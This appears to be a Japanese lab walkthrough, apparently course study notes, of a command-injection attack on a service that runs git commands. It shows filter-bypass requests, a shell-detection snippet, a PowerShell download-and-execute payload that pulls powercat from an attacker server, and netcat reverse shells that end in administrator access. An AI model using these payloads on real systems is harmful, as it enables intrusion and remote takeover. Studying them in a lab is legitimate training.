gitコマンドを受け付けるサーバ
## 手順
- git cloneを行い任意のリポジトリをアップできるサイトにコマンドインジェクションを行う
1. Burpを起動し通信傍受の準備

2. ブラウザからサイトにアクセスし通常のアップロード操作を行う

3. 傍受した通信の内容を確認
![](Assets/Images/Pasted%20image%2020260428054752.png)
/archiveというディレクトリに、Archive=コマンドという形式ポストしていることが確認できる

4. 他のコマンドとの応答の違いを確認
```bash
# 実行
curl -X POST --data 'Archive=ipconfig' http://192.168.121.189:8000/archive
# 結果
Command Injection detected. Aborting...%!(EXTRA string=ipconfig)
```

```bash
# 実行
curl -X POST --data 'Archive=git version' http://192.168.121.189:8000/archive
# 結果
Repository successfully cloned with command: git version and output: git version 2.36.1.windows.1
```

5. gitとURLエンコードした;（セミコロン）とipconfigを送信
```bash
# 実行
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.121.189:8000/archive
# 結果
Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.121.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.121.254
   ```
```

6. 挿入したコマンドがPowerShellかcmdかの確認
```bash
# コードが実行される場所を確認するためのコードスニペット
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.121.189:8000/archive
```

```bash
# 結果
PowerShell
```

7. シェルへのアクセス
- Powercatを使って リバースシェルを作成します。Powercatは、Kaliに含まれるNetcatのPowerShell実装です。
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```
- 新しいターミナルを起動し、Powercatをkaliユーザーのホームディレクトリにコピーし、同じディレクトリでPython3ウェブサーバーを起動します。
```bash
python3 -m http.server 80
```
- リバース シェルをキャッチするためにポート 4444 に Netcat リスナーを作成するための 3 番目のターミナル タブを起動します。

```bash
nc -nvlp 4444
```

- 以下をURLエンコードしてコマンドに組み込み、送信
```bash
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.204/powercat.ps1");powercat -c 192.168.45.204 -p 4444 -e powershell 
```

```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.204%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.204%20-p%204444%20-e%20powershell' http://192.168.121.189:8000/archive
```

- 成功
![](Assets/Images/Pasted%20image%2020260428054837.png)
```bash
nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.204] from (UNKNOWN) [192.168.121.189] 63599
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows


PS C:\Users\Administrator\Documents\meteor> whoami
whoami
mountain\administrator

PS C:\Users\Administrator\Documents\meteor> 
```

8. ターゲットがLinuxの場合
- Netcatリスナーの起動
```bash
rlwrap nc -nlvp 4444
```

- nc 192.168.45.204 4444 -e /bin/bashを送信
```bash
curl -X POST --data 'Archive=git%3B/bin/nc%20192.168.45.204%204444%20-e%20/bin/bash' http://192.168.121.16/archive
```

- 結果
![](Assets/Images/Pasted%20image%2020260428054851.png)
